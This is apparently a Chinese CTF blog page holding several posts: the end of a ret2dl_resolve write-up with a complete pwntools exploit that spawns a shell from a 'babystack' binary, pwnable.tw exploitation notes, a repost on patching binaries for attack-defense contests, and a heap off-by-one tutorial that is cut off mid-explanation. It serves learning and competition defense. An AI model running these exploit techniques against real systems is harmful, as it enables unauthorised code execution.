<p>这其中，rax=0x40033c是.gnu.version所在。而这里还存在一处检查。查看dl-runtime.c文件，这部分对应的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   /* Look up the target symbol. If the normal lookup rules are not</span><br><span class="line">used don&apos;t look in the global scope. */</span><br><span class="line">if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">&#123;</span><br><span class="line">const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">const ElfW(Half) *vernum =</span><br><span class="line">(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">if (version-&gt;hash == 0)</span><br><span class="line">version = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里，应该是由于我们构造的伪symbol的index过大，使得vernum[ELFW(R_SYM) (reloc-&gt;r_info)]读取出错。为了绕过这部分，roputils选择的方法便是令l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL。相关的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR [r10+0x1c8]</span><br><span class="line">   0x00007ffff7de943b &lt;+107&gt;:   test rax,rax</span><br><span class="line">   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff</span><br></pre></td></tr></table></figure>
<p>这里的r10保存的便是link_map的地址，所以只需QWORD PTR [r10+0x1c8]处为NULL即可跳过这一段。这便是roputils中这一操作的由来。</p>
<p>完整EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"> </span><br><span class="line">ppp_ret = <span class="number">0x080484e9</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"> </span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x804843B</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">200</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span><span class="comment">#plt addr</span></span><br><span class="line">ret_plt = <span class="number">0x080482b0</span><span class="comment">#jmprel</span></span><br><span class="line"> </span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - ret_plt</span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line"> </span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(plt_0)</span><br><span class="line">payload += p32(index_offset)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span></span><br><span class="line">payload += fake_reloc</span><br><span class="line">payload += align * <span class="string">"B"</span></span><br><span class="line">payload += fake_sym</span><br><span class="line">payload += <span class="string">"systemx00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line">payload += cmd + <span class="string">'x00'</span></span><br><span class="line">payload += <span class="string">"A"</span>*(<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * (offset)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)  <span class="comment">#mov esp, ebp; pop ebp; ret</span></span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h1><pre><code>+可以绕过%u %d而不更改数据
</code></pre><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><pre><code>;sh 可以在字节数不够的情况下使用
_free_hook
和_malloc_hook也可以覆盖
</code></pre><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><pre><code>/proc/self/maps可以查看当前程序heap和程序内存
/proc/self/mem可以读写当前程序内存
</code></pre><h1 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h1><pre><code>one_gadget (execve)可以应对只有eip可以覆盖
</code></pre><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><pre><code>栈写入后调用函数，信息还在
canary每次不会变
</code></pre><h1 id="Starbound"><a href="#Starbound" class="headerlink" title="Starbound"></a>Starbound</h1><pre><code>堆栈结合rop
</code></pre><h1 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h1><pre><code>double free 可以双悬挂在只有malloc的情况下uaf
_malloc_hook前面凑7f
这道题double free双悬挂凑uaf然后伪造堆块
跳到_IO_list_all前面的7f改为main_arena然后放到
unsortbin一个伪造io然后跳system
</code></pre><h1 id="Kidding"><a href="#Kidding" class="headerlink" title="Kidding"></a>Kidding</h1><pre><code>反弹shell绕过无法直接回显的题    
打开套接字dup进行文件描述符复制
將__stack_prot設為7。
將__libc_stack_end的address放入eax中。
_调用_dl_make_stack_executable。
关闭nx
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/patch/">patch</a></h1>
  

    </header>
    <div class="entry">
      
        <p>转自peda</p>
<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>IDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。</p>
<p>以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-1.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-1.png" alt="img"></a></p>
<p>很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。</p>
<p>这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行:</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-2.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-2.png" alt="img"></a></p>
<p>选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov edx, 1cch改为mov edx, 138h。</p>
<p>此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL);</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-3.png" alt="img"></a></p>
<p>但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-3.png" alt="img"></a></p>
<p>这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。</p>
<h1 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h1><p>lief是一个开源的跨平台的可执行文件修改工具，链接如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lief-project/LIEF</span><br></pre></td></tr></table></figure>
<p>对外提供了Python、C++、C的接口。</p>
<p>对于Python库安装可以使用pip，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install lief</span><br></pre></td></tr></table></figure>
<p>对于lief的API和用法就不介绍了，RTFM。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lief.quarkslab.com/doc/latest/api/python/index.html</span><br></pre></td></tr></table></figure>
<p>以下是几种可行的patch方法</p>
<h2 id="增加segment"><a href="#增加segment" class="headerlink" title="增加segment"></a>增加segment</h2><p>这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。</p>
<p>首先我们的代码程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&apos;s go\n&quot;);</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&apos;s gogo\n&quot;);</span><br><span class="line">  return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void myprintf(char *a,int b)&#123;</span><br><span class="line">	asm(</span><br><span class="line">		&quot;mov %rdi,%rsi\n&quot;</span><br><span class="line">		&quot;mov $0,%rdi\n&quot;</span><br><span class="line">		&quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">		&quot;mov $0x1,%rax\n&quot;</span><br><span class="line">		&quot;syscall\n&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line">void myputs(char *a)&#123;</span><br><span class="line">	asm(</span><br><span class="line">		&quot;push $0x41414141\n&quot;</span><br><span class="line">		&quot;push $0x42424242\n&quot;</span><br><span class="line">		&quot;push %rsp\n&quot;</span><br><span class="line">		&quot;pop  %rsi\n&quot;</span><br><span class="line">		&quot;mov $0,%rdi\n&quot;</span><br><span class="line">		&quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">		&quot;mov $0x1,%rax\n&quot;</span><br><span class="line">		&quot;syscall\n&quot;</span><br><span class="line">		&quot;pop %rax\n&quot;</span><br><span class="line">		&quot;pop %rax\n&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br></pre></td></tr></table></figure>
<p>如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。</p>
<p>patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。</p>
<p>lief中提供了add参数可以用于为二进制文件增加段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary    = lief.parse(binary_name)</span><br><span class="line">lib  = lief.parse(lib_name)	</span><br><span class="line">segment_add = binary.add(lib.segments[0])</span><br></pre></td></tr></table></figure>
<p>在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr</p>
<p>因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx  =(addr of new segment + offset function ) -  (addr of order + 5 /*length of call xx*/)</span><br></pre></td></tr></table></figure>
<p>由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def patch_call(file,where,end,arch = &quot;amd64&quot;):</span><br><span class="line">	print hex(end)</span><br><span class="line"></span><br><span class="line">	length = p32((end - (where + 5 )) &amp; 0xffffffff)</span><br><span class="line">	order = &apos;\xe8&apos;+length</span><br><span class="line">	print disasm(order,arch=arch)</span><br><span class="line">	file.patch_address(where,[ord(i) for i in order])</span><br></pre></td></tr></table></figure>
<p>执行之后可以看到patch成功了，</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-5.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-5.png" alt="img"></a></p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-6.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-6.png" alt="img"></a></p>
<p>但是一个重大的问题是patch前后文件大小改动很大：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]</span><br><span class="line">└─[$] &lt;&gt; python 1.py</span><br><span class="line">0x8022f9</span><br><span class="line">   0:   e8 70 1d 40 00          call   0x401d75</span><br><span class="line">[+] ori size 8656</span><br><span class="line">[+] patch size 15885</span><br><span class="line">[+] Seccessful patched in adding segment</span><br></pre></td></tr></table></figure>
<p>这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。</p>
<h2 id="增加library"><a href="#增加library" class="headerlink" title="增加library"></a>增加library</h2><p>这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;, 102LL, envp, argv);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译一个动态链接库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//#include &quot;/home/p4nda/linux-4.17.3/lib/syscall.c&quot;</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">//#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">// gcc -nostdlib  -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int printf(char *a,int b) &#123;</span><br><span class="line">	char str[] = &quot;hacked by me\n &quot;;</span><br><span class="line">	//puts(a);</span><br><span class="line">	if(strstr(a,&quot;/bin/sh&quot;))&#123;</span><br><span class="line">		puts(&quot;find dangerous str~&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	int (*old_printf)(char *,int);</span><br><span class="line">	old_printf =(int (*)(char *,int)) dlsym(RTLD_NEXT, &quot;printf&quot;);</span><br><span class="line">	old_printf(a,b); </span><br><span class="line">	puts(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-7.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-7.png" alt="img"></a></p>
<p>优势很明显，可以执行任意libc内函数代码，让编程更容易。</p>
<p>不过缺点也很明显，首先程序变得<strong>巨大</strong>，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了…</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-8.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-8.png" alt="img"></a></p>
<h2 id="修改程序-eh-frame段"><a href="#修改程序-eh-frame段" class="headerlink" title="修改程序.eh_frame段"></a>修改程序.eh_frame段</h2><p>在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-10.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-10.png" alt="img"></a></p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-11.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-11.png" alt="img"></a></p>
<p>可以看到在patch前后，程序大小保持不变。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-9.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-9.png" alt="img"></a></p>
<p>缺点同样明显，.eh_frame的大小是有限的…</p>
<p>综上，似乎没有比较简洁的通用方法，综合着来用吧….</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/offbyone/">off-by-one</a></h1>
  

    </header>
    <div class="entry">
      
        <p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教程。在这篇文章中我列出了5种常见的堆上的off-by-one攻击方式，并且给出了测试DEMO，测试的环境均为x86。</p>
<h1 id="达成漏洞利用的条件"><a href="#达成漏洞利用的条件" class="headerlink" title="达成漏洞利用的条件"></a>达成漏洞利用的条件</h1><pre><code>off-by-one并不是全都可以达到利用的目的的。首先就要求堆必须以要求的size+0x4字节（x86）的大小进行分配。如果不满足这个条件那么就无法覆盖到inuse位了。这个是由于堆的字节对齐机制造成的，简单的说堆块是以8字节进行对齐的（x64为16字节）。如果malloc(1024)，那么实际会分配1024+8=1032字节，这一点很好理解。但是如果是malloc(1020)呢，1020+8=1028字节，而1028不满足8字节对齐，那么实际只会分配1020+4=1024字节，多出的4个字节由下一块的prev_size提供空间。
而对于触发unlink的操作来说，还需要一个额外的附加条件。因为现在的unlink是有检验的，所以需要一个指向堆上的指针才可以。
</code></pre><h1 id="漏洞利用的效果"><a href="#漏洞利用的效果" class="headerlink" title="漏洞利用的效果"></a>漏洞利用的效果</h1><p>off-by-one能达到什么利用效果呢？<br>这个是很关键的问题。根据分类来看可以实现两种效果</p>
<h2 id="1-chunk-overlapping"><a href="#1-chunk-overlapping" class="headerlink" title="1.chunk overlapping"></a>1.chunk overlapping</h2><pre><code>所谓的chunk overlapping是指，
针对一个目标堆块。我们可以通过一些操作，
使这个目标堆块被我们重新分配到某个我们控制的新的堆块中，
这样就可以对目标堆块进行任意的读写了。
</code></pre><h2 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h2><pre><code>这种off-by-one造成的unlink的利用效果其实和溢出造成的unlink的利用效果是一致的。
对于small bin可以使指向堆的指针ptr的值变为&amp;ptr-0xc，
这样再结合一系列的操作就可以达成几乎无限次的write-anything-anywhere了。
</code></pre><p>而large bin的unlink则可以实现一次任意地址写（write-anything-anywhere）。</p>
<h1 id="堆块格式"><a href="#堆块格式" class="headerlink" title="堆块格式"></a>堆块格式</h1><p>inuse()：仅通过下一块的inuse位来判定当前块是否使用.</p>
<p>prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。</p>
<p>next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头</p>
<p>chunksize()：仅通过本块的size确定本块的大小。</p>
<h1 id="达成漏洞利用的具体操作"><a href="#达成漏洞利用的具体操作" class="headerlink" title="达成漏洞利用的具体操作"></a>达成漏洞利用的具体操作</h1><h2 id="off-by-one-overwrite-allocated"><a href="#off-by-one-overwrite-allocated" class="headerlink" title="off-by-one overwrite allocated"></a>off-by-one overwrite allocated</h2><p>在这种情况下堆块布局是这样的</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|<br>    A是发生有off-by-one的堆块，<br>    其中B和C是allocated状态的块。而且C是我们的攻击目标块。<br>    我们的目标是能够读写块C，<br>    那么就应该去构造出这样的内存布局。<br>    然后通过off-by-one去改写块B的size域<br>    （注意要保证inuse域的值为1，否则会触发unlink导致crash）<br>    以实现把C块给整个包含进来。通过把B给free掉，<br>    然后再allocated一个大于B+C的块就可以返回B的地址，并且可以读写块C了。</p>
<p>具体的操作是：</p>
<ol>
<li><p>构成图示的内存布局</p>
</li>
<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
</li>
<li><p>free掉B块</p>
</li>
<li><p>malloc一个B+C大小的块</p>
</li>
<li><p>通过返回的地址即可对C任意读写</p>
</li>
</ol>
<pre><code>注意，必须要把C块整个包含进来，否则free时会触发check
，导致抛出错误。因为ptmalloc实现时的验证逻辑是
当前块的下一块的inuse必须为1，否则在free时会触发异常，
这一点本来是为了防止块被double free而做的限制，却给我们伪造堆块造成了障碍。
</code></pre><h2 id="off-by-one-overwrite-freed"><a href="#off-by-one-overwrite-freed" class="headerlink" title="off-by-one overwrite freed"></a>off-by-one overwrite freed</h2><p>在这种情况下堆块布局依然是这样的</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
<pre><code>A是发生有off-by-one的堆块，
其中B是free状态的块,C是allocated块。而且C是我们的攻击目标块。
我们的目标是能够读写块C，
那么就应该去构造出这样的内存布局。
然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1）
以实现把C块给整个包含进来。但是这种情况下的B是free状态的,
通过增大B块包含C块，
然后再allocated一个B+C尺寸的堆块就可以返回B的地址，并且可以读写块C了。
</code></pre><p>具体的操作是：</p>
<ol>
<li><p>构成图示的内存布局</p>
</li>
<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
</li>
<li><p>malloc一个B+C大小的块</p>
</li>
<li><p>通过返回的地址即可对C任意读写</p>
</li>
</ol>
<h2 id="off-by-one-null-byte"><a href="#off-by-one-null-byte" class="headerlink" title="off-by-one null byte"></a>off-by-one null byte</h2><pre><code>这种情况就与上面两种有所不同了，
在这种情况下溢出的这个字节是一个&apos;\x00&apos;字节。
这种off-by-one可能是最为常见的
相比于前两种，这种利用方式就显得更复杂，而且对内存布局的要求也更高了。
</code></pre><p>首先内存布局需要三个块</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
<pre><code>其中A,B,C都是allocated块，A块发生了null byte off-by-one,
覆盖了B块的inuse位，使B块伪造为空。
然后在分配两个稍小的块b1、b2，根据ptmalloc的实现，
这两个较小块（不能是fastbin）会分配在B块中。
然后只要释放掉b1，再释放掉C，就会引发从原B块到C的合并。
